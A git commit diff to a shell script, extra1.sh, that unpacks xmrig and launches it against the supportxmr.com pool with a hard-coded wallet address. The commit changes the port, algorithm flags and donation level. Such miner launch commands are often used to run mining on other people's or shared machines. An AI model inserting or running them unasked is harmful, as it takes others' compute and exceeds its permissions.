affa1c06604e80bca5f882ae1cb96b59c83c57ef
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-21 15:32:55 +0100

    Update extra1.sh

--- extra1.sh
+++ extra1.sh
@@ -1,3 +1,3 @@
 tar xvzf xmrig-v6.12.1-C3-linux-Static.tar.gz
-./xmrig -o pool.supportxmr.com:443 algo=rx/wow -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x
-./xmrig -o pool.supportxmr.com:443 algo=rx/arq -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -k --tls
+./xmrig -a rx/wow --donate-level=1 -o pool.supportxmr.com:7777  -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x
+./xmrig -a rx/arq --donate-level=1 -o pool.supportxmr.com:7777  -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -k --tls
